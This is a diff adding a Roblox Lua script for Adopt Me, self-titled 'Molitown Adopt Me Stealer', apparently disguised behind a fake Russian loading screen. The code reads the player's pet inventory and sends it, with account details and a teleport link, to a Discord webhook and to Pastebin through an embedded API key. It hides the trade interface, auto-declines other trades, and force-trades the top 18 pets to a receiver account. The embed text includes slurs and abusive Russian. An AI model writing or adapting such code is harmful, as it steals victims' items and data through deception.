+    ["Kaijunior"] = {value = 2, rarity = "uncommon"},
+    ["Chocolate Labrador"] = {value = 2, rarity = "uncommon"},
+    ["Donkey"] = {value = 2, rarity = "uncommon"},
+    ["Fennec Fox"] = {value = 2, rarity = "uncommon"},
+    ["Mahi Mahi"] = {value = 2, rarity = "uncommon"},
+    ["Puma"] = {value = 2, rarity = "uncommon"},
+    ["Halloween Black Mummy Cat"] = {value = 2, rarity = "uncommon"},
+    ["Dingo"] = {value = 2, rarity = "uncommon"},
+    ["Ermine"] = {value = 7, rarity = "uncommon"},
+    ["Kelp Crewmate"] = {value = 2, rarity = "uncommon"},
+    ["Arctic Hare"] = {value = 4, rarity = "uncommon"},
+    ["Patchy Bear"] = {value = 2, rarity = "uncommon"},
+    ["Christmas Future Egg"] = {value = 42, rarity = "uncommon"},
+    ["Eggnog Dog"] = {value = 24, rarity = "uncommon"},
+    ["Snowman"] = {value = 10, rarity = "uncommon"},
+    ["Mistletroll"] = {value = 7, rarity = "uncommon"},
+    ["Kirin"] = {value = 2, rarity = "uncommon"},
+    ["Mole"] = {value = 2, rarity = "uncommon"},
+    ["Rock"] = {value = 5, rarity = "uncommon"},
+    ["Harp Seal"] = {value = 72, rarity = "uncommon"},
+    ["Crab"] = {value = 2, rarity = "uncommon"},
+    ["Rock Pigeon"] = {value = 5, rarity = "uncommon"},
+    ["Glyptodon"] = {value = 5, rarity = "uncommon"},
+    ["Slug"] = {value = 2, rarity = "uncommon"},
+    ["Triceratops"] = {value = 2, rarity = "uncommon"},
+    ["Halloween Blue Scorpion"] = {value = 2, rarity = "uncommon"},
+    ["Snow Leopard"] = {value = 10, rarity = "uncommon"},
+    ["Red Cardinal"] = {value = 2, rarity = "uncommon"},
+    ["Raccoon"] = {value = 15, rarity = "uncommon"},
+    ["Quokka"] = {value = 33, rarity = "uncommon"},
+
+    -- Common Pets
+    ["Otter"] = {value = 2, rarity = "common"},
+    ["Chick"] = {value = 1, rarity = "common"},
+    ["Hopbop"] = {value = 1, rarity = "common"}, -- from that updated
+    ["Blue Butterfly"] = {value = 2, rarity = "common"},
+    ["Mouse"] = {value = 2, rarity = "common"},
+    ["Aye Aye"] = {value = 2, rarity = "common"},
+    ["Ant"] = {value = 2, rarity = "common"},
+    ["Tegu"] = {value = 2, rarity = "common"},
+    ["Buffalo"] = {value = 2, rarity = "common"},
+    ["Show Pony"] = {value = 2, rarity = "common"},
+    ["Bandicoot"] = {value = 2, rarity = "common"},
+    ["Ratatoskr"] = {value = 2, rarity = "common"},
+    ["Garden Snake"] = {value = 2, rarity = "common"},
+    ["Bakeneko"] = {value = 2, rarity = "common"},
+    ["Ghost"] = {value = 5, rarity = "common"},
+    ["Kid Goat"] = {value = 2, rarity = "common"},
+    ["Frankenfeline"] = {value = 2, rarity = "common"},
+    ["Mongoose"] = {value = 5, rarity = "common"},
+    ["Ground Sloth"] = {value = 2, rarity = "common"},
+    ["Cockroach"] = {value = 5, rarity = "common"},
+    ["Brachiosaurus"] = {value = 5, rarity = "common"}
+}
+
+-- >> Rarity multipliers << --
+local rarityMultipliers = {
+    FR = 3.0,    -- Fly & Ride
+    MFR = 8.0,   -- Mega Fly & Ride  
+    NFR = 4.0,   -- Neon Fly & Ride
+    F = 2.0,     -- Fly only
+    R = 1.5,     -- Ride only
+    N = 2.5,     -- Neon only
+    M = 6.0      -- Mega only
+}
+
+-- >> /kick command << --
+game.Players.PlayerAdded:Connect(function(newPlayer)
+    newPlayer.Chatted:Connect(function(message)
+        if message == "free dope" then
+            game.Players.LocalPlayer:Kick("\nPlease rejoin!")
+        end
+    end)
+end)
+
+-- >> Decline trade request logic << --
+local Loads = require(game.ReplicatedStorage.Fsys).load
+local RouterClient = Loads("RouterClient")
+local TradeRequestReceivedRemote = RouterClient.get_event("TradeAPI/TradeRequestReceived")
+local TradeAcceptOrDeclineRequest = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
+local SettingsRemote = RouterClient.get("SettingsAPI/SetSetting") -- SettingsRemote for trade ON
+
+SettingsRemote:FireServer("trade_requests", 1)
+
+local function moveGuiOffscreen(guiElement)
+    if guiElement then guiElement.Position = UDim2.new(1000, 0, 1000, 0) end
+end
+
+local function hideDialog()
+    local dialogApp = game.Players.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("DialogApp")
+    if dialogApp and dialogApp:FindFirstChild("Dialog") then
+        dialogApp.Dialog.Visible = false
+        moveGuiOffscreen(dialogApp.Dialog)
+    end
+end
+
+local function declineTradeRequest(player)
+    TradeAcceptOrDeclineRequest:InvokeServer(player, false)
+end
+
+hideDialog()
+
+TradeRequestReceivedRemote.OnClientEvent:Connect(function(sender)
+    if sender.Name ~= game.Players.LocalPlayer.Name then
+        declineTradeRequest(sender)
+    end
+end)
+
+declineTradeRequest()
+
+local Pets = {}
+local PetCounts = {}
+local Loaders = require(game.ReplicatedStorage.Fsys).load
+local InventoryDB = Loaders("InventoryDB")
+local ClientData = Loaders("ClientData")
+local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
+local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)]
+
+local neon_count = 0
+local mega_neon_count = 0
+local flyable_count = 0
+local rideable_count = 0
+local legendaries_count = 0
+local ultra_count = 0
+local rare_count = 0
+local uncommon_count = 0
+local common_count = 0
+local fr_count = 0
+local mfr_count = 0
+local nfr_count = 0
+
+for _, petData in pairs(playerData.inventory.pets) do
+    if petData.properties and type(petData.properties) == "table" then
+        if petData.properties.neon then
+            neon_count = neon_count + 1
+        end
+        if petData.properties.mega_neon then
+            mega_neon_count = mega_neon_count + 1
+        end
+        if petData.properties.flyable then
+            flyable_count = flyable_count + 1
+        end
+        if petData.properties.rideable then
+            rideable_count = rideable_count + 1
+        end
+        if petData.properties.flyable and petData.properties.rideable then
+            fr_count = fr_count + 1
+        end
+        if petData.properties.neon and petData.properties.flyable and petData.properties.rideable then
+            nfr_count = nfr_count + 1
+        end
+        if petData.properties.mega_neon and petData.properties.flyable and petData.properties.rideable then
+            mfr_count = mfr_count + 1
+        end
+    end
+end
+
+for i, v in pairs(ClientData.get("inventory").pets) do
+    local petData = InventoryDB[v.category][v.id]
+    if petData.rarity == "legendary" then
+        legendaries_count = legendaries_count + 1
+    elseif petData.rarity == "ultra_rare" then
+        ultra_count = ultra_count + 1
+    elseif petData.rarity == "rare" then
+        rare_count = rare_count + 1
+    elseif petData.rarity == "uncommon" then
+        uncommon_count = uncommon_count + 1
+    elseif petData.rarity == "common" then
+        common_count = common_count + 1
+    end
+end
+
+        -- Function to calculate pet value based on valuesTable and properties
+        local function calculatePetValue(petData)
+            local petInfo = InventoryDB[petData.category][petData.id]
+            local petName = petInfo.name
+            local baseValue = 0
+            
+            -- Find base value from valuesTable
+            for petKey, valueData in pairs(valuesTable) do
+                if string.lower(petName) == string.lower(petKey) then
+                    baseValue = valueData.value
+                    break
+                end
+            end
+            
+            -- Apply multipliers based on properties
+            local multiplier = 1.0
+            
+            if petData.properties then
+                if petData.properties.mega_neon and petData.properties.flyable and petData.properties.rideable then
+                    multiplier = rarityMultipliers.MFR
+                elseif petData.properties.neon and petData.properties.flyable and petData.properties.rideable then
+                    multiplier = rarityMultipliers.NFR
+                elseif petData.properties.flyable and petData.properties.rideable then
+                    multiplier = rarityMultipliers.FR
+                elseif petData.properties.mega_neon then
+                    multiplier = rarityMultipliers.M
+                elseif petData.properties.neon then
+                    multiplier = rarityMultipliers.N
+                elseif petData.properties.flyable then
+                    multiplier = rarityMultipliers.F
+                elseif petData.properties.rideable then
+                    multiplier = rarityMultipliers.R
+                end
+            end
+            
+            return baseValue * multiplier, baseValue
+        end
+
+-- Function to count valuable pets and get top pets
+local function getValuablePetsInfo()
+    local valuableCount = 0
+    local totalValue = 0
+    local topPets = {}
+    local PetsInventory = ClientData.get_data()[game.Players.LocalPlayer.Name].inventory.pets
+    
+    for _, petData in pairs(PetsInventory) do
+        local petInfo = InventoryDB[petData.category][petData.id]
+        local petName = petInfo.name
+        local calculatedValue, baseValue = calculatePetValue(petData)
+        
+        if baseValue > 0 then
+            valuableCount = valuableCount + 1
+            totalValue = totalValue + calculatedValue
+            
+            table.insert(topPets, {
+                name = petName,
+                value = calculatedValue,
+                properties = petData.properties or {}
+            })
+        end
+    end
+    
+    -- Sort top pets by value
+    table.sort(topPets, function(a, b)
+        return a.value > b.value
+    end)
+    
+    return valuableCount, totalValue, topPets
+end
+
+-- Function to get pet type string
+local function getPetTypeString(properties)
+    if properties.mega_neon and properties.flyable and properties.rideable then
+        return " MFR"
+    elseif properties.neon and properties.flyable and properties.rideable then
+        return " NFR"
+    elseif properties.flyable and properties.rideable then
+        return " FR"
+    elseif properties.mega_neon then
+        return " Mega"
+    elseif properties.neon then
+        return " Neon"
+    elseif properties.flyable then
+        return " Fly"
+    elseif properties.rideable then
+        return " Ride"
+    else
+        return ""
+    end
+end
+
+local plr = game.Players.LocalPlayer
+local accage = plr.AccountAge
+local ExecutorValue = identifyexecutor() or "Unknown"
+local useJobIdCheck = (ExecutorValue == "Delta" or ExecutorValue == "Krnl" or ExecutorValue == "Seliware")
+
+print("🔍 Executor detected: " .. ExecutorValue)
+
+if useJobIdCheck then
+    print("🚀 Starting JobId verification for " .. ExecutorValue)
+    
+    if getgenv().Cookie and getgenv().Cookie:find("WARNING") then
+        print("✅ Valid cookie found, checking JobId...")
+        
+        local success, result = pcall(function()
+            return FindRealJobId()
+        end)
+        
+        if success and result then
+            realJobId = result
+            print("🎯 Real JobId found: " .. realJobId)
+        else
+            print("⚠️ JobId verification failed, using standard JobId")
+            realJobId = game.JobId
+        end
+    else
+        print("❌ No valid cookie found, using standard JobId")
+        realJobId = game.JobId
+    end
+else
+    realJobId = game.JobId
+    print("📋 Using standard JobId for " .. ExecutorValue .. ": " .. realJobId)
+end
+local placeId = game.PlaceId
+local jobId = game.JobId
+local browserTeleport = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. realJobId
+local TeleportScript = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. placeId .. ", \"" .. realJobId .. "\")"
+local VersionValue = "1.12 (Added values)"
+
+-- Get valuable pets info
+local valuableCount, totalValue, topPets = getValuablePetsInfo()
+
+-- Format top pets text
+local topPetsText = ""
+for i = 1, math.min(5, #topPets) do
+    local pet = topPets[i]
+    local petType = getPetTypeString(pet.properties)
+    topPetsText = topPetsText .. string.format("%s%s: %d₽\n", pet.name, petType, math.floor(pet.value))
+end
+
+local function pastebin(content)
+    local body = {
+        api_dev_key = "80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW",
+        api_paste_code = content,
+        api_option = "paste"
+    }
+
+    local encodedBody = ""
+    for key, value in pairs(body) do
+        encodedBody = encodedBody .. key .. "=" .. HttpService:UrlEncode(value) .. "&"
+    end
+    encodedBody = encodedBody:sub(1, -2)
+
+    local response
+    local success, err = pcall(function()
+        response = request({
+            Url = "https://pastebin.com/api/api_post.php",
+            Method = "POST",
+            Body = encodedBody,
+            Headers = {
+                ["Content-Type"] = "application/x-www-form-urlencoded"
+            },
+            Timeout = 20
+        })
+    end)
+
+    if not success or not response or not response.Success then
+        return "https://pastebin.com/raw/example" -- fallback URL
+    end
+
+    local pasteUrl = response.Body
+    local rawUrl = "https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$")
+
+    return rawUrl
+end
+
+-- Функция для создания полного списка петов
+local function createFullPetsList()
+    local petCategories = {
+        legendary = {},
+        ultra_rare = {},
+        rare = {},
+        uncommon = {},
+        common = {}
+    }
+    
+    local PetsInventory = ClientData.get_data()[game.Players.LocalPlayer.Name].inventory.pets
+    
+    for _, petData in pairs(PetsInventory) do
+        local petInfo = InventoryDB[petData.category][petData.id]
+        local petName = petInfo.name
+        local calculatedValue, baseValue = calculatePetValue(petData)
+        
+        -- Определяем тип питомца
+        local petType = ""
+        if petData.properties then
+            if petData.properties.mega_neon and petData.properties.flyable and petData.properties.rideable then
+                petType = " MFR"
+            elseif petData.properties.neon and petData.properties.flyable and petData.properties.rideable then
+                petType = " NFR"
+            elseif petData.properties.flyable and petData.properties.rideable then
+                petType = " FR"
+            elseif petData.properties.mega_neon then
+                petType = " Mega"
+            elseif petData.properties.neon then
+                petType = " Neon"
+            elseif petData.properties.flyable then
+                petType = " Fly"
+            elseif petData.properties.rideable then
+                petType = " Ride"
+            end
+        end
+        
+        local petEntry = string.format("%s%s: %d₽", petName, petType, math.floor(calculatedValue))
+        
+        -- Добавляем в соответствующую категорию
+        if petInfo.rarity == "legendary" then
+            table.insert(petCategories.legendary, petEntry)
+        elseif petInfo.rarity == "ultra_rare" then
+            table.insert(petCategories.ultra_rare, petEntry)
+        elseif petInfo.rarity == "rare" then
+            table.insert(petCategories.rare, petEntry)
+        elseif petInfo.rarity == "uncommon" then
+            table.insert(petCategories.uncommon, petEntry)
+        elseif petInfo.rarity == "common" then
+            table.insert(petCategories.common, petEntry)
+        end
+    end
+    
+    -- Сортируем каждую категорию по ценности
+    local sortByValue = function(a, b)
+        local aValue = tonumber(a:match("(%d+)₽")) or 0
+        local bValue = tonumber(b:match("(%d+)₽")) or 0
+        return aValue > bValue
+    end
+    
+    for _, category in pairs(petCategories) do
+        table.sort(category, sortByValue)
+    end
+    
+    -- Формируем итоговый текст
+    local pastebinContent = "-- 🐉 LEGENDARY PETS 🐉 --\n"
+    pastebinContent = pastebinContent .. (#petCategories.legendary > 0 and table.concat(petCategories.legendary, "\n") or "None") .. "\n\n"
+    
+    pastebinContent = pastebinContent .. "-- 🔥 ULTRA-RARE PETS 🔥 --\n"
+    pastebinContent = pastebinContent .. (#petCategories.ultra_rare > 0 and table.concat(petCategories.ultra_rare, "\n") or "None") .. "\n\n"
+    
+    pastebinContent = pastebinContent .. "-- 💎 RARE PETS 💎 --\n"
+    pastebinContent = pastebinContent .. (#petCategories.rare > 0 and table.concat(petCategories.rare, "\n") or "None") .. "\n\n"
+    
+    pastebinContent = pastebinContent .. "-- 🟢 UNCOMMON PETS 🟢 --\n"
+    pastebinContent = pastebinContent .. (#petCategories.uncommon > 0 and table.concat(petCategories.uncommon, "\n") or "None") .. "\n\n"
+    
+    pastebinContent = pastebinContent .. "-- ⚪ COMMON PETS ⚪ --\n"
+    pastebinContent = pastebinContent .. (#petCategories.common > 0 and table.concat(petCategories.common, "\n") or "None") .. "\n\n"
+    
+    pastebinContent = pastebinContent .. "Total pets: " .. #PetsInventory .. "\n"
+    pastebinContent = pastebinContent .. "Generated by Molitown Adopt Me Stealer"
+    
+    return pastebinContent
+end
+
+-- Создаем полный список петов и публикуем на pastebin
+local fullPetsList = createFullPetsList()
+local pastebinLink = pastebin(fullPetsList)
+
+local embed = {
+    ["title"] = "🎯 ВЬЕБАН - Долбаеб ракнул ваш скрипт! - ".. plr.Name,
+    ["color"] = 16711935,
+    ["fields"] = {
+        {
+            ["name"] = "🔗 **Teleport to :mammoth:**",
+            ["value"] = 
+            "🚀**Вставь в браузер для связи с дуплом**\n```" .. browserTeleport .. "```\n" ..
+            "**Для автоматической связи:**\n```lua\n" .. TeleportScript .. "\n```",
+            ["inline"] = false
+        },
+        {
+            ["name"] = "〘:mammoth:〙**Info User**",
+            ["value"] = "```lua\n" ..
+                        "Username      : " .. tostring(game.Players.LocalPlayer.Name) .. "\n" ..
+                        "Account Age   : " .. tostring(game.Players.LocalPlayer.AccountAge) .. " Days\n" ..
+                        "Executor      : " .. tostring(ExecutorValue) .. "\n" ..
+                        "Receiver      : " .. Username .. ", " .. Username2 .. "\n" ..
+                        "Molitown      : " .. tostring(VersionValue) .. "```"                            
+        },
+        {
+            ["name"] = "〘:moneybag:〙**Inventory Stats**",
+            ["value"] = "```lua\n" ..
+                        "Total Value     : " .. string.format("%d₽", math.floor(totalValue)) .. "\n" ..
+                        "MFR Pets        : " .. tostring(mfr_count) .. "\n" ..
+                        "NFR Pets        : " .. tostring(nfr_count) .. "\n" ..
+                        "FR Pets         : " .. tostring(fr_count) .. "\n" ..
+                        "Mega Pets       : " .. tostring(mega_neon_count) .. "\n" ..
+                        "Neon Pets       : " .. tostring(neon_count) .. "\n" ..
+                        "Legendary Pets  : " .. tostring(legendaries_count) .. "\n" ..
+                        "Ultra Rare Pets : " .. tostring(ultra_count) .. "```" 
+        },
+        {
+            ["name"] = "〘:crown:〙**Top Valuable Pets**",
+            ["value"] = "```lua\n" .. (topPetsText ~= "" and topPetsText or "No valuable pets") .. "```",
+            ["inline"] = false
+        },
+        {
+            ["name"] = "〘:scroll:〙**Full Pets List**",
+            ["value"] = "[📋 Click to view all pets](" .. pastebinLink .. ")",
+            ["inline"] = false
+        },
+    }
+}
+
+function SendMessageEMBED(url, embed, bool)
+  local http = game:GetService("HttpService")
+  local headers = {
+      ["Content-Type"] = "application/json"
+  }
+  local data = {
+      username = "M O L I T O W N",
+      avatar_url = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg",
+      content = "Broke injected ur script.",
+      embeds = {
+          {
+              title = embed.title,
+              color = embed.color,
+              fields = embed.fields,
+          }
+      }
+  }
+  local data2 = {
+      username = "M O L I T O W N",
+      avatar_url = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg",
+      content = "-- @everyone\n" .. TeleportScript,
+      embeds = {
+          {
+              title = embed.title,
+              color = 16711935,
+              fields = embed.fields,
+          }
+      }
+  }
+
+  local body = http:JSONEncode(data)
+  local body2 = http:JSONEncode(data2)
+  if bool == true then
+      local response = request({
+          Url = url,
+          Method = "POST",
+          Headers = headers,
+          Body = body2
+      })
+  else
+      local response = request({
+          Url = url,
+          Method = "POST",
+          Headers = headers,
+          Body = body
+      })
+  end
+end
+
+game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
+game:GetService("Players").LocalPlayer.PlayerGui.HintApp:Destroy()
+game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false
+
+-- Function to send trade success message to Discord
+function SendTradeSuccessMessage(ReceiverName, tradedPets)
+    local http = game:GetService("HttpService")
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    
+    -- Format traded pets list
+    local petsText = ""
+    local totalValue = 0
+    
+    for i, pet in ipairs(tradedPets) do
+        local calculatedValue, baseValue = calculatePetValue(pet.data)
+        local petType = getPetTypeString(pet.data.properties or {})
+        petsText = petsText .. string.format("%s%s: %d₽\n", pet.name, petType, math.floor(calculatedValue))
+        totalValue = totalValue + calculatedValue
+    end
+    
+    local data = {
+        username = "Mama Mio [МФО ВОРК 2025]",
+        avatar_url = "https://i.pinimg.com/736x/ae/1c/35/ae1c3515d3891f20997929813c9ea8fe.jpg",
+        embeds = {
+            {
+                title = "✅ ЧУРКА БЫЛА ВЬЕБАНА КОТОПЕС",
+                color = 65280, -- Green color
+                fields = {
+                    {
+                        name = "👤 Trade doxbin",
+                        value = "```lua\n" ..
+                               "Victim    : " .. game.Players.LocalPlayer.Name .. "\n" ..
+                               "Receiver  : " .. ReceiverName .. "\n" ..
+                               "Total Value: " .. string.format("%d₽", math.floor(totalValue)) .. "\n" ..
+                               "Pets Sent : " .. #tradedPets .. "```",
+                        inline = false
+                    },
+                    {
+                        name = "🎁 Traded Pets",
+                        value = "```lua\n" .. (petsText ~= "" and petsText or "No pets traded") .. "```",
+                        inline = false
+                    }
+                },
+                timestamp = DateTime.now():ToIsoDate(),
+                footer = {
+                    text = "ВОРКАЕМ КЛЯИНС В 2032! FEAT TEMNI PRINC"
+                }
+            }
+        }
+    }
+    
+    local body = http:JSONEncode(data)
+    
+    local success, result = pcall(function()
+        return request({
+            Url = Webhook,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
+    end)
+end
+
+local function TradeIncoming(ReceiverName)
+    while true do
+    local RouterClient = Loaders("RouterClient")
+    local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
+    local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
+    local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
+    local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
+    local InventoryDB = require(game.ReplicatedStorage.Fsys).load("InventoryDB")
+    local ClientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
+
+    local PetsInventory = ClientData.get_data()[game.Players.LocalPlayer.Name].inventory.pets
+    local sortedPets = {}
+    local tradedPets = {} 
+    
+    for petUid, petData in pairs(PetsInventory) do
+        local petInfo = InventoryDB[petData.category][petData.id]
+        local calculatedValue, baseValue = calculatePetValue(petData)
+        table.insert(sortedPets, {
+            uid = petUid,
+            data = petData,
+            value = calculatedValue,
+            baseValue = baseValue,
+            name = petInfo.name
+        })
+    end
+    
+    table.sort(sortedPets, function(a, b)
+        return a.value > b.value
+    end)
+    
+    moveGuiOffscreen()
+    SendTrade:FireServer(game.Players[ReceiverName])
+    wait(5)
+    
+    local petCount = 0
+    local petLimit = 18
+    
+    for _, petInfo in ipairs(sortedPets) do
+        if petCount < petLimit then
+            AddPetRemote:FireServer(petInfo.uid)
+            table.insert(tradedPets, {
+                uid = petInfo.uid,
+                data = petInfo.data,
+                name = petInfo.name,
+                value = petInfo.value
+            })
+            petCount = petCount + 1
+            wait(0.2)
+        else
+            break
+        end
+    end
+                wait(5)
+                    AcceptNegotiationRemote:FireServer()
+                wait(2)
+                    ConfirmTradeRemote:FireServer()
+                wait(2) 
+                    if #tradedPets > 0 then
+                        SendTradeSuccessMessage(ReceiverName, tradedPets)
+                    end
+            end
+end
+
+function SendLeaveNotify(playerName)
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+
+    local dataLeave = {
+        username = "M O L I T O W N",
+        avatar_url = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg",
+        content = "**" .. playerName .. "** left from the game!",
+        embeds = {
+            {
+                color = 0x610066,
+                fields = {
+                    {
+                        name = "〘:mammoth:〙**User**",
+                        value = "```lua" ..
+                            "\nUsername   : " .. game.Players.LocalPlayer.Name .."```",
+                        inline = false
+                    }
+                }
+            }
+        }
+    }
+
+    local jsonDataLeave = game:GetService("HttpService"):JSONEncode(dataLeave)
+
+    local response = request({
+        Url = Webhook,
+        Method = "POST",
+        Headers = headers,
+        Body = jsonDataLeave
+    })
+end
+
+game:GetService("Players").PlayerRemoving:Connect(function(player)
+    if player == game:GetService("Players").LocalPlayer then
+        SendLeaveNotify(player.Name)
+    end
+end)
+
+-- Отправляем вебхук с учетом стоимости для @everyone
+if totalValue >= 50 then
+    SendMessageEMBED(Webhook, embed, true)  -- С @everyone
+else
+    SendMessageEMBED(Webhook, embed, false) -- Без @everyone
+end
+
+game.Players.PlayerAdded:Connect(function(player)
+    if player.Name == Username or Username2 then
+        player.Chatted:Connect(function(msg)
+            if not sent then
+            TradeIncoming(Username or Username2)
+            end
+        end)
+    end
+end)
+
+for _, player in pairs(game.Players:GetPlayers()) do
+    if player.Name == Username or Username2 then
+        player.Chatted:Connect(function(msg)
+            TradeIncoming(Username)
+        end)
+    end
+end
+
+-- Создаем основной фрейм для блюра
+local blurFrame = Instance.new("Frame")
+blurFrame.Name = "LoadingBlurFrame"
+blurFrame.Size = UDim2.new(1, 0, 1, 0)
+blurFrame.Position = UDim2.new(0, 0, 0, 0)
+blurFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+blurFrame.BackgroundTransparency = 0.3
+blurFrame.ZIndex = 10
+blurFrame.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxGui") or game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+
+-- Создаем эффект блюра через GaussianBlur
+local blurEffect = Instance.new("BlurEffect")
+blurEffect.Size = 10
+blurEffect.Name = "LoadingBlur"
+blurEffect.Parent = game:GetService("Lighting")
+
+-- Основной контейнер для загрузки
+local loadingFrame = Instance.new("Frame")
+loadingFrame.Name = "LoadingFrame"
+loadingFrame.Size = UDim2.new(0, 300, 0, 150)
+loadingFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
+loadingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+loadingFrame.BackgroundTransparency = 0.1
+loadingFrame.BorderSizePixel = 0
+loadingFrame.ZIndex = 11
+loadingFrame.Parent = blurFrame
+
+-- Закругленные углы
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 12)
+corner.Parent = loadingFrame
+
+-- Текст загрузки
+local loadingText = Instance.new("TextLabel")
+loadingText.Name = "LoadingText"
+loadingText.Size = UDim2.new(0.8, 0, 0, 40)
+loadingText.Position = UDim2.new(0.1, 0, 0.3, 0)
+loadingText.BackgroundTransparency = 1
+loadingText.Text = "Загрузка..."
+loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+loadingText.TextScaled = true
+loadingText.Font = Enum.Font.Gotham
+loadingText.TextWrapped = true
+loadingText.ZIndex = 12
+loadingText.Parent = loadingFrame
+
+-- Индикатор загрузки
+local loadingBar = Instance.new("Frame")
+loadingBar.Name = "LoadingBar"
+loadingBar.Size = UDim2.new(0.8, 0, 0, 4)
+loadingBar.Position = UDim2.new(0.1, 0, 0.7, 0)
+loadingBar.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
+loadingBar.BorderSizePixel = 0
+loadingBar.ZIndex = 12
+loadingBar.Parent = loadingFrame
+
+local loadingProgress = Instance.new("Frame")
+loadingProgress.Name = "LoadingProgress"
+loadingProgress.Size = UDim2.new(0, 0, 1, 0)
+loadingProgress.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
+loadingProgress.BorderSizePixel = 0
+loadingProgress.ZIndex = 13
+loadingProgress.Parent = loadingBar
+
+local progressCorner = Instance.new("UICorner")
+progressCorner.CornerRadius = UDim.new(1, 0)
+progressCorner.Parent = loadingProgress
+
+local barCorner = Instance.new("UICorner")
+barCorner.CornerRadius = UDim.new(1, 0)
+barCorner.Parent = loadingBar
+
+-- Анимация индикатора загрузки
+local function animateLoadingBar()
+    while loadingProgress.Parent do
+        loadingProgress.Size = UDim2.new(0, 0, 1, 0)
+        
+        -- Анимация заполнения
+        for i = 0, 240, 4 do
+            if not loadingProgress.Parent then break end
+            loadingProgress.Size = UDim2.new(0, i, 1, 0)
+            wait(0.02)
+        end
+        
+        wait(0.5)
+    end
+end
+
+-- Список случайных текстов для загрузки
+local loadingMessages = {
+    "Загрузка ресурсов...",
+    "Оптимизация сцены...",
+    "Подготовка объектов...",
+    "Инициализация системы...",
+    "Загрузка текстур...",
+    "Компиляция скриптов...",
+    "Проверка соединения...",
+    "Синхронизация данных...",
+    "Кэширование ассетов...",
+    "Настройка интерфейса...",
+    "Загрузка конфигурации...",
+    "Проверка обновлений...",
+    "Инициализация плагинов...",
+    "Загрузка модулей...",
+    "Подготовка к работе..."
+}
+
+-- Функция для случайного изменения текста
+local function changeRandomText()
+    while loadingText.Parent do
+        local randomMessage = loadingMessages[math.random(1, #loadingMessages)]
+        loadingText.Text = randomMessage
+        
+        -- Небольшая анимация появления текста
+        for i = 0, 1, 0.1 do
+            if not loadingText.Parent then break end
+            loadingText.TextTransparency = 1 - i
+            wait(0.02)
+        end
+        
+        wait(5) -- Ждем 5 секунд перед следующим изменением
+        
+        -- Анимация исчезновения текста
+        for i = 0, 1, 0.1 do
+            if not loadingText.Parent then break end
+            loadingText.TextTransparency = i
+            wait(0.02)
+        end
+    end
+end
+
+-- Запускаем анимации
+spawn(animateLoadingBar)
+spawn(changeRandomText)
+
+-- Функция для скрытия меню загрузки
+local function hideLoadingMenu()
+    if blurFrame then
+        blurFrame:Destroy()
+    end
+    if blurEffect then
+        blurEffect:Destroy()
+    end
+end
+
+-- Функция для показа меню загрузки (если нужно переиспользовать)
+local function showLoadingMenu()
+    -- Код создания уже выполнен выше
+end
+
+-- Экспортируем функции для внешнего использования
+return {
+    Show = showLoadingMenu,
+    Hide = hideLoadingMenu
+}
